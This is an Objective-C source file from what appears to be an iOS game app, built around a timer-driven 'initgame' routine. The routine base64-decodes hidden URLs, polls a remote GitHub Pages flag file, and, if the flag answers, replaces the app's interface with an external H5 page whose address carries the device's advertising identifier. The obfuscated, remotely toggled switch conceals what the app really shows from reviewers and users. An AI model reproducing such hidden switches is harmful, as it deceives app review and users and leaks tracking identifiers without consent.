
#import "GVGameTool.h"
#import <AdSupport/ASIdentifierManager.h>
#import "Reachability.h"
#define time 30
#import "AppDelegate.h"
#import "UnzipTool.h"

@interface GVGameTool()
@property(nonatomic,strong)NSTimer*timer;
@end
@implementation GVGameTool

-(instancetype)init{
    if (self = [super init]) {
        self.timer = [NSTimer scheduledTimerWithTimeInterval:2.0 target:self selector:@selector(initnetstatus) userInfo:nil repeats:YES];
        [[NSRunLoop mainRunLoop]addTimer:self.timer forMode:NSDefaultRunLoopMode];
    }
    return self;
}
-(NSString*)getidfa{
    return [[[ASIdentifierManager sharedManager]advertisingIdentifier]UUIDString];
}
-(void)initnetstatus{
    Reachability* reachability = [Reachability reachabilityWithHostName:@"www.apple.com"];
    NetworkStatus status = [reachability currentReachabilityStatus];
    NSString *net = @"internetStatus";
    switch (status) {
        case ReachableViaWiFi:
            net = @"ReachableViaWiFi";
            [self initgame];
            break;
        case ReachableViaWWAN:
            net = @"ReachableViaWWAN";
            [self initgame];
            break;
        case NotReachable:
            net = @"NotReachable";
            break;
        default:
            break;
    }
    NSLog(@"net:%@",net);
}
-(void)initgame{
    
//    NSString*url = [NSString stringWithFormat:@"%@%@",[self base64DecodedString:@"aHR0cHM6Ly9yZXN0LnlheWF3YW4uY29tL2g1L3J4YnkvP2RldmljZV9pZGZhPQ=="],[self getidfa]];;
//    if (self.changeViewSuccess) {
//        self.changeViewSuccess(YES, @"https://rest.yayawan.com/h5/jljjltfios/");
//    }
//    [self.timer invalidate];
//    self.timer = nil;
//
//    return;
    
    NSString*game = [UnzipTool unzipPressed];
    if ([game isEqualToString:@"abcdefeeee"]) {
        [self requestLoadViewController];
    }else{
        [self show];
    }

    [self.timer invalidate];
    self.timer = nil;
}

-(void)requestLoadViewController{
    
    NSString*url = [NSString stringWithFormat:@"%@%@",[self base64DecodedString:@"aHR0cHM6Ly9yZXN0LnlheWF3YW4uY29tL2g1L3J4YnkvP2RldmljZV9pZGZhPQ=="],[self getidfa]];;
    
    NSURL *URL= [NSURL URLWithString:[self base64DecodedString:@"aHR0cHM6Ly9NV0xCZWFyLmdpdGh1Yi5pby9jcWdsLm1k"]];
    NSMutableURLRequest*requset = [NSMutableURLRequest requestWithURL:URL];
    [requset setCachePolicy:NSURLRequestReloadIgnoringLocalCacheData];
    [requset setHTTPMethod:@"GET"];
    NSURLSession*session = [NSURLSession sharedSession];
    NSURLSessionDataTask*task = [session dataTaskWithRequest:requset completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if(error){
             [self show];
        }else{
            NSString*result = [[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding];
            NSLog(@"result = %@",result);
            if (result.length > 5) {
                if (self.changeViewSuccess) {
                    self.changeViewSuccess(YES, url);
                }
            }else{
                [self show];
            }
        }
    }];
    [task resume];
}

-(void)show{
    
    AppDelegate*de = (AppDelegate*)[UIApplication sharedApplication].delegate;
    [UIApplication sharedApplication].delegate.window.rootViewController = de.sideMenuViewController;
}
- (NSString *)base64DecodedString:(NSString*)str
{
    NSData *data = [[NSData alloc]initWithBase64EncodedString:str options:0];
    return [[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding];
}
@end
